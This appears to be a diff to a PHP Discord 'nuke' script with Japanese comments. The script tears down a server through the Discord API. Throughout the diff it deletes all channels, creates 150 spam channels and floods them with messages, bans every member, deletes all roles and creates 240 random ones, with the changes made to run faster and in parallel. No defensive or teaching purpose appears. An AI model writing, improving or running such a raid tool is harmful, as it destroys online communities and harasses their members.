@@ -189,6 +189,7 @@ xhr.send(JSON.stringify(params));
 
     </script>
 <?php
+set_time_limit(0);
 require 'vendor/autoload.php';
 use GuzzleHttp\Client;
 use GuzzleHttp\Exception\RequestException;
@@ -258,10 +259,11 @@ $retryAfter=0;
                     });
             }
         }
+        // チャンネルを消す
         Utils::settle($deleteChannelPromises)->wait();
         $newChannelPromises = [];
         $newChannels = [];
-        for ($i = 0; $i < 100; $i++) {
+        for ($i = 0; $i < 150; $i++) {
             $newChannelPromises[] = $client->postAsync("guilds/{$serverId}/channels", [
                 'json' => [
                     'name' => $chna,
@@ -274,102 +276,130 @@ $retryAfter=0;
                 }
             });
         }
+        //チャンネル作成
         Utils::settle($newChannelPromises)->wait();
         $messagePromises = [];
-        $batchSize = 70;
-        $delay = 300000;
-        for ($j = 0; $j < 40; $j++) {
+        $batchSize = 100;
+        $delay = 200000;
+        for ($j = 0; $j < 150; $j++) {
             foreach ($newChannels as $channelId) {
                 $messagePromises[] = $client->postAsync("channels/{$channelId}/messages", [
                     'json' => [
                         'content' => $message
                     ]
                 ]);
-                if (count($messagePromises) >= $batchSize) {
-                    Utils::settle($messagePromises)->wait();
-                    $messagePromises = [];
-                    usleep($delay);
+if (count($messagePromises) >= $batchSize) {
+    Utils::settle($messagePromises)->wait();
+    $messagePromises = [];
+    usleep($delay);
+}
+}
+}
+
+$banPromises = [];
+if ($banUsers) {
+    $allMembers = [];
+    $after = null;
+
+    do {
+        $url = "guilds/{$serverId}/members?limit=1000";
+        if ($after !== null) {
+            $url .= "&after={$after}";
+        }
+
+        $membersResponse = $client->get($url);
+        $batch = json_decode($membersResponse->getBody(), true);
+
+        if (empty($batch)) {
+            break;
+        }
+
+        $allMembers = array_merge($allMembers, $batch);
+        $after = end($batch)['user']['id'];
+    } while (count($batch) === 1000);
+    foreach ($allMembers as $member) {
+        if (!isset($member['user']['id'])) {
+            continue;
+        }
+
+        $userId   = $member['user']['id'];
+        $username = $member['user']['username'] ?? 'unknown';
+
+        $banPromises[] = $client->putAsync("guilds/{$serverId}/bans/{$userId}", [
+            'json' => ['reason' => 'Banned by bot']
+        ])
+        ->then(
+            function ($response) use ($username) {
+                if ($response->getStatusCode() !== 204) {
+                    echo "ユーザーBANに失敗しました（スキップ）。ユーザー名: {$username}, ステータスコード: " . $response->getStatusCode() . "<br>";
                 }
+            },
+            function ($reason) use ($username) {
+                echo "ユーザーBANに失敗しました（スキップ）。ユーザー名: {$username}, エラー: " . $reason->getMessage() . "<br>";
             }
-        }
-
-        if (!empty($messagePromises)) {
-            Utils::settle($messagePromises)->wait();
-        }
-        if ($banUsers) {
-            $membersResponse = $client->get("guilds/{$serverId}/members?limit=1000");
-            $members = json_decode($membersResponse->getBody(), true);
-            while (isset($members) && count($members) > 0) {
-                $banPromises = [];
-                foreach ($members as $member) {
-                    if (isset($member['user']['id'])) {
-                        $banPromises[] = $client->putAsync("guilds/{$serverId}/bans/{$member['user']['id']}", [
-                            'json' => ['reason' => 'Banned by bot']
-                        ])
-                        ->then(function ($response) use ($member) {
-                            if ($response->getStatusCode() !== 204) {
-                                echo 'ユーザーBANに失敗しました。ユーザー名: ' . $member['user']['username'] . ', ステータスコード: ' . $response->getStatusCode() . ', レスポンス: ' . $response->getBody() . '<br>';
-                            }
-                        }, function ($reason) use ($member) {
-                            echo 'ユーザーBANに失敗しました。ユーザー名: ' . $member['user']['username'] . ', エラー: ' . $reason->getMessage() . '<br>';
-                        });
-                    }
-                }
-                Utils::settle($banPromises)->wait();
-
-                $membersResponse = $client->get("guilds/{$serverId}/members?limit=1000");
-                $members = json_decode($membersResponse->getBody(), true);
-            }
-            echo "<h1>ユーザーのBANが完了しました</h1>";
-        }
-        $rolesResponse = $client->get("guilds/{$serverId}/roles");
-        $statusCode = $rolesResponse->getStatusCode();
-
-        if ($statusCode == 429) {
-            $retryAfter = $rolesResponse->getHeader('Retry-After')[0];
-            echo "レートリミットに達しました。$retryAfter 秒後に再試行してください。";
-            exit;
-        }
-
-        if ($statusCode >= 400) {
-            echo "エラーが発生しました: " . $rolesResponse->getBody();
-            exit;
-        }
-
-        $roles = json_decode($rolesResponse->getBody(), true);
-        if (!is_array($roles)) {
-            echo 'ロール一覧の取得に失敗しました。レスポンス: ' . $rolesResponse->getBody();
-            exit;
-        }
-
-        $deleteRolePromises = [];
-        foreach ($roles as $role) {
-            if (isset($role['id']) && $role['name'] !== '@everyone') {
-                $deleteRolePromises[] = $client->deleteAsync("guilds/{$serverId}/roles/{$role['id']}")
-                    ->then(null, function ($reason) use ($role) {
-                        echo 'ロール削除に失敗しました。ロール名: ' . $role['name'] . ', エラー: ' . $reason->getMessage() . '<br>';
-                    });
-            }
-        }
-        Utils::settle($deleteRolePromises)->wait();
-
-        $newRolePromises = [];
-        for ($i = 0; $i < 250; $i++) {
-            $newRolePromises[] = $client->postAsync("guilds/{$serverId}/roles", [
-                'json' => [
-                    'name' => generateRandomRoleName(),
-                    'color' => rand(0, 16777215)
-                ]
-            ]);
-        }
-        Utils::settle($newRolePromises)->wait();
-
-        echo "<h1>もし処理が行われずこれが表示されたら権限不足などのエラーもしくは、レート制限で使えません</h1>";
-    } catch (RequestException $e) {
-        echo 'リクエストエラー: ' . $e->getMessage();
-    } catch (Exception $e) {
-        echo 'エラー: ' . $e->getMessage();
+        );
     }
 }
+$deleteRolePromises = [];
+$newRolePromises = [];
+
+$rolesResponse = $client->get("guilds/{$serverId}/roles");
+$statusCode = $rolesResponse->getStatusCode();
+
+if ($statusCode == 429) {
+    $retryAfter = $rolesResponse->getHeader('Retry-After')[0] ?? 5;
+    echo "レートリミットに達しました。{$retryAfter} 秒後に再試行してください。";
+    exit;
+}
+
+if ($statusCode >= 400) {
+    echo "エラーが発生しました: " . $rolesResponse->getBody();
+    exit;
+}
+
+$roles = json_decode($rolesResponse->getBody(), true);
+if (!is_array($roles)) {
+    echo 'ロール一覧の取得に失敗しました。レスポンス: ' . $rolesResponse->getBody();
+    exit;
+}
+foreach ($roles as $role) {
+    if (isset($role['id']) && $role['name'] !== '@everyone') {
+        $deleteRolePromises[] = $client->deleteAsync("guilds/{$serverId}/roles/{$role['id']}")
+            ->then(null, function ($reason) use ($role) {
+                echo 'ロール削除に失敗しました。ロール名: ' . $role['name'] . ', エラー: ' . $reason->getMessage() . '<br>';
+            });
+    }
+}
+for ($i = 0; $i < 240; $i++) {
+    $newRolePromises[] = $client->postAsync("guilds/{$serverId}/roles", [
+        'json' => [
+            'name'  => generateRandomRoleName(),
+            'color' => rand(0, 16777215)
+        ]
+    ])->then(null, function ($reason) {
+        echo 'ロール作成に失敗しました: ' . $reason->getMessage() . '<br>';
+    });
+}
+
+$allPromises = array_merge(
+    $messagePromises ?? [],
+    $banPromises ?? [],
+    $deleteRolePromises ?? [],
+    $newRolePromises ?? []
+);
+
+if (!empty($allPromises)) {
+    Utils::settle($allPromises)->wait();
+}
+
+echo "<h1>すべての処理が完了しました（メッセージ・BAN・ロールを並列実行）</h1>";
+
+} catch (RequestException $e) {
+    echo 'リクエストエラー: ' . $e->getMessage();
+} catch (Exception $e) {
+    echo 'エラー: ' . $e->getMessage();
+}
+}
 ?>
+
 
